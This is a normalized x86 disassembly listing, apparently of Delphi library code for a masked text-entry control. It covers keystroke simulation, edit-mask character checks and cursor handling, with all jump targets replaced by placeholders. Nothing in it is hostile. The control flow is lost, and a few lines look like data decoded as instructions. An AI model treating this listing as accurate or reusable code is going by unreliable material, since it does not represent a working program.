cmp ebx [ ebp - 0x8 ]
je r-xdata
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x230 ] edx
jmp r-xdata
lea eax [ ebp - 0x108 ]
push eax
call GetKeyboardState
mov edx 0x100
lea eax [ ebp - 0x208 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461d0f
lea eax [ ebp - 0x21c ]
mov edx 0x5
call sub_403fe0
retn
mov [ eax ] 0x0
inc eax
dec edx
jne r-xdata
mov [ ebp - 0x1f8 ] 0x81
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403468
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
mov [ ebp + eax - 0x208 ] 0x81
lea eax [ ebp - 0x208 ]
push eax
call SetKeyboardState
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x1
xor eax eax
push ebp
push sub_461c76
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403468
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x100
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call SendMessageA
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403468
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x101
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x0
retn
sub_461d18
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4449fc
test al al
je r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_461888
test al al
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_461a60
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_461aa8
sub_461d64
push ebx
mov ebx eax
mov eax ebx
call sub_4341b4
test al al
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x238 ]
mov eax ebx
call sub_461558
xor edx edx
mov eax ebx
call sub_4341ec
sub_461d8c
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_461f51
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
xor eax eax
mov al [ ebx ]
cmp ax 0x1b
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xec ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461f58
lea eax [ ebp - 0x10 ]
call sub_403fbc
retn
cmp [ esi + 0x20e ] 0x0
jne r-xdata
xor eax eax
mov al [ ebx ]
cmp ax 0x8
je r-xdata
cmp ax 0xd
jne r-xdata
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_461a60
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xf8 ]
jmp r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov dx 0x2e
mov eax esi
call sub_4622cc
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4621a0
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_461aa8
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_46286c
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push 0x1
push 0x102
push 0x102
mov eax esi
call sub_4446f8
push eax
lea eax [ ebp - 0x2c ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebp - 0x28 ] 0x12
jne r-xdata
lea eax [ ebp - 0x10 ]
mov dl [ ebx ]
call sub_4041a4
lea eax [ ebp - 0x30 ]
mov dl [ ebx ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
call sub_402b6c
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x24 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x38 ]
lea eax [ ebp - 0x34 ]
mov cl 0x2
call sub_402b3c
lea edx [ ebp - 0x34 ]
lea eax [ ebp - 0x10 ]
call sub_404220
mov ecx [ ebp - 0x8 ]
add ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_461a84
jmp r-xdata
mov eax [ ebp - 0x24 ]
push eax
call PostQuitMessage
mov eax [ ebp - 0x10 ]
call sub_40447c
push eax
push 0x0
push 0xc2
mov eax esi
call sub_4446f8
push eax
call SendMessageA
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_461a60
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_46214c
sub_461f64
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46213e
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp - 0x1 ] 0x4
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462145
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403fe0
retn
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_461a60
test [ ebp - 0x1 ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
cmp si 0x27
jne r-xdata
cmp si 0x25
jne r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
cmp eax 0x2
jne r-xdata
dec [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
add eax 0x2
cmp eax [ ebp - 0xc ]
jne r-xdata
inc [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
inc eax
cmp eax [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_462184
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x230 ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4615c0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebx + 0x230 ] 0x0
jge r-xdata
mov eax [ ebx + 0x230 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
mov eax [ ebx + 0x228 ]
cmp eax [ ebx + 0x230 ]
jge r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_461a84
inc [ ebx + 0x230 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4615c0
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_461aa8
jmp r-xdata
mov edx [ ebx + 0x230 ]
mov eax ebx
call sub_461aa8
jmp r-xdata
dec [ ebx + 0x230 ]
cmp si 0x25
jne r-xdata
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov ecx eax
mov edx eax
mov eax ebx
call sub_461a84
dec [ ebx + 0x230 ]
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov ecx 0x1
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46214c
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46214c
jmp r-xdata
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46214c
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_462184
jmp r-xdata
sub_46214c
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea ebx [ ecx + edi ]
mov edx ebx
mov eax esi
call sub_4621a0
mov ebx eax
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_46040c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_461aa8
pop edi
pop esi
pop ebx
retn
mov ebx edi
sub_4621a0
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
cmp ebx [ esi + 0x228 ]
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_46040c
test al al
jne r-xdata
inc ebx
sub_4621c8
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jge r-xdata
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_46040c
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_4621a0
mov ebx eax
dec ebx
sub_4621fc
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] cl
mov esi edx
mov ebx eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_461a60
cmp si 0x24
jne r-xdata
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x1
je r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_461aa8
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
xor edx edx
mov eax ebx
call sub_461aa8
mov eax [ esp + 0x4 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
mov ecx [ ebx + 0x228 ]
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_461a84
mov eax ebx
call sub_461d18
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp + 0x8 ]
xor edx edx
mov eax ebx
call sub_461a84
mov eax ebx
call sub_461d18
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
mov eax [ ebx + 0x228 ]
mov [ ebx + 0x230 ] eax
mov eax [ esp + 0x8 ]
dec eax
mov [ esp + 0x4 ] eax
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
mov [ esp + 0x8 ] eax
sub_4622cc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
lea edi [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_4623d8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x20e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4623df
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_461a60
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jg r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jl r-xdata
cmp si 0x8
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4615c0
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
push eax
lea edx [ ebp - 0xc ]
mov ecx [ edi ]
mov eax ebx
call sub_462d84
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
sub ecx [ edi ]
mov edx [ edi ]
inc edx
mov eax [ ebp - 0xc ]
call sub_4044dc
mov eax [ ebp - 0xc ]
call sub_40447c
push eax
push 0x0
push 0xc2
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
je r-xdata
mov esi [ edi ]
mov edx [ edi ]
mov eax ebx
call sub_462184
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_461a60
cmp esi [ edi ]
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_461a60
mov edx [ edi ]
dec edx
mov eax ebx
call sub_461aa8
mov edx [ edi ]
mov eax ebx
call sub_4621a0
mov [ edi ] eax
mov edx [ edi ]
mov eax ebx
call sub_461aa8
jmp r-xdata
sub_4623e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46246b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_461888
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_434934
test [ ebx + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x22d ] 0x2
jne r-xdata
and [ ebx + 0x22d ] 0xfd
mov eax ebx
call sub_461d18
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4615c0
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x238 ]
call sub_404010
mov edx esi
mov eax ebx
call sub_434934
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462472
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_462478
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4624f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_434970
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4615c0
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x238 ]
call sub_404010
mov eax ebx
call sub_4449fc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462500
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_461a60
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4621a0
cmp eax [ ebp - 0x4 ]
je r-xdata
mov edx eax
mov eax ebx
call sub_461aa8
sub_462508
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x4 ] 0x1b
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_461888
test al al
je r-xdata
mov eax ebx
call sub_4341b4
test al al
je r-xdata
mov [ esi + 0xc ] 0x1
sub_462540
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_461888
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_443b20
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov eax ebx
call sub_461d18
sub_462574
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_462606
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4615c0
mov eax esi
call sub_461888
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46260d
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax esi
call sub_4341b4
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf0 ]
test al al
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_461aa8
mov eax esi
mov edx [ eax ]
call [ edx + 0xf4 ]
or [ esi + 0x22d ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_462614
push ebx
add esp 0xfffffff8
mov ebx eax
push 0x0
call MessageBeep
mov eax [ ebx + 0x220 ]
mov [ esp ] eax
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b50c
call sub_4039f8
pop ecx
pop edx
pop ebx
retn
sub_462650
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push edi
mov cl [ ebx + 0x224 ]
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_45ffc4
push edi
mov cl 0x20
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_45ffc4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_462698
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46285e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x1
mov eax esi
mov edx ebx
call sub_404010
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_40427c
mov ebx eax
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx 0x1
call sub_45ff28
mov ebx eax
test bl 0x1
je r-xdata
mov edi 0x1
mov eax [ esi ]
call sub_40427c
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
test ebx ebx
jle r-xdata
mov [ ebp - 0xc ] 0x1
mov eax [ esi ]
call sub_40427c
mov ebx eax
test ebx ebx
jle r-xdata
mov al [ ebp - 0xd ]
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ esi ]
call sub_40427c
mov ecx eax
sub ecx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
inc edx
mov eax [ esi ]
call sub_4044dc
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0xc ]
dec ecx
mov eax [ esi ]
mov edx 0x1
call sub_4044dc
mov edx [ ebp - 0x18 ]
mov eax esi
pop ecx
call sub_4042c8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x224 ] 0x20
je r-xdata
mov edi 0x1
cmp [ ebp - 0xc ] 0x1
je r-xdata
mov edi 0x1
inc edi
dec ebx
jne r-xdata
inc [ ebp - 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462865
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403fe0
retn
mov eax [ esi ]
call sub_40427c
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ esi ]
call sub_40427c
mov edx eax
dec edx
mov eax esi
call sub_404608
inc edi
dec ebx
jne r-xdata
push esi
mov eax [ esi ]
call sub_40427c
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov eax [ esi ]
mov edx [ ebp - 0xc ]
call sub_4044dc
jmp r-xdata
inc [ ebp - 0xc ]
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx edi
call sub_45fdd4
mov [ ebp - 0xd ] al
mov al [ ebp - 0xd ]
dec eax
sub al 0x2
jae r-xdata
mov edi 0x1
mov eax [ ebp - 0x8 ]
sub eax edi
mov edx [ esi ]
mov al [ edx + eax ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov eax esi
call j_sub_404488
mov [ eax + edi - 0x1 ] 0x20
inc edi
dec ebx
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
sub_46286c
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov ebp edx
mov esi eax
mov bl 0x1
cmp [ esi + 0x220 ] 0x0
je r-xdata
test bl bl
jne r-xdata
xor ebx ebx
mov edx edi
mov eax [ esi + 0x220 ]
call sub_4603b0
mov edi eax
test edi edi
jl r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x0
call MessageBeep
mov edx edi
mov eax [ esi + 0x220 ]
call sub_45fdd4
mov [ esp ] al
mov al [ ebp ]
mov [ esp + 0x1 ] al
mov edx ebp
mov ecx edi
mov eax esi
call sub_462a00
mov ebx eax
test bl bl
jne r-xdata
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
mov cl [ esp + 0x1 ]
mov edx edi
mov eax esi
call sub_4630e0
mov edi eax
test edi edi
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_46035c
mov edi eax
mov edx edi
mov eax esi
call sub_461aa8
jmp r-xdata
sub_462920
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
xor eax eax
push ebp
push sub_4629ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_46035c
mov ebx eax
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_40427c
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
jle r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax - 0x1 ]
call sub_402a44
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax ]
call sub_402a44
pop edx
cmp dl al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi ]
call sub_4615c0
mov eax [ ebp - 0x4 ]
mov edx ebx
call sub_40bdc8
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ esi ]
call sub_4615c0
mov eax [ ebp - 0x8 ]
lea edx [ ebx + 0x1 ]
call sub_40bdc8
cmp al 0x1
je r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4629f5
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
sub_462a00
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_462cb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_45fdd4
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_45ff28
mov [ ebp - 0xa ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
movzx eax [ eax + edx - 0x1 ]
cmp eax 0x43
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx - 0x1 ]
call sub_45ffa4
mov [ ebx ] al
jmp r-xdata
sub eax 0x4c
je r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462cb9
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_403fe0
retn
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x15
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x23
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_404054
lea eax [ ebp - 0x10 ]
call j_sub_404488
mov dl [ ebx ]
mov [ eax ] dl
mov al [ ebx ]
call sub_462908
test al al
je r-xdata
push ebp
mov al [ ebx ]
call sub_462920
pop ecx
test al al
je r-xdata
sub eax 0x2
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
je r-xdata
push ebp
mov al [ ebx ]
call sub_462920
pop ecx
test al al
je r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0xd
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub eax 0x9
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_404054
lea eax [ ebp - 0x10 ]
call j_sub_404488
mov dl [ ebx ]
mov [ eax ] dl
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x20
je r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0x9
je r-xdata
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x41
je r-xdata
jmp r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_407c8c
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_404054
jmp r-xdata
cmp [ ebx ] 0x2b
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
sub eax 0x8
je r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_407c8c
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
call sub_404054
jmp r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaNumericA
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x61
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_407cc0
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
call sub_404054
cmp [ ebx ] 0x2d
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
call sub_407cc0
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_404054
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub_462cc7
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov [ esp + 0x8 ] 0x1
mov [ esp + 0xc ] 0x1
mov eax [ ebp + 0x220 ]
call sub_40427c
mov esi eax
test esi esi
jle r-xdata
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi 0x1
inc [ esp + 0xc ]
jmp r-xdata
sub al 0x2
jne r-xdata
inc edi
dec esi
jne r-xdata
cmp bl 0x4
jne r-xdata
mov eax [ ebp + 0x220 ]
mov edx edi
call sub_45fdd4
mov ebx eax
mov eax ebx
dec eax
sub al 0x2
jb r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
mov al [ eax + edx - 0x1 ]
cmp al [ ebp + 0x224 ]
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0xc ]
dec eax
mov edx [ esp + 0x4 ]
mov [ edx ] eax
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
inc [ esp + 0xc ]
mov eax [ ebp + 0x220 ]
cmp [ eax + edi - 0x1 ] 0x43
je r-xdata
sub_462d84
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x1
test eax eax
je r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x8 ]
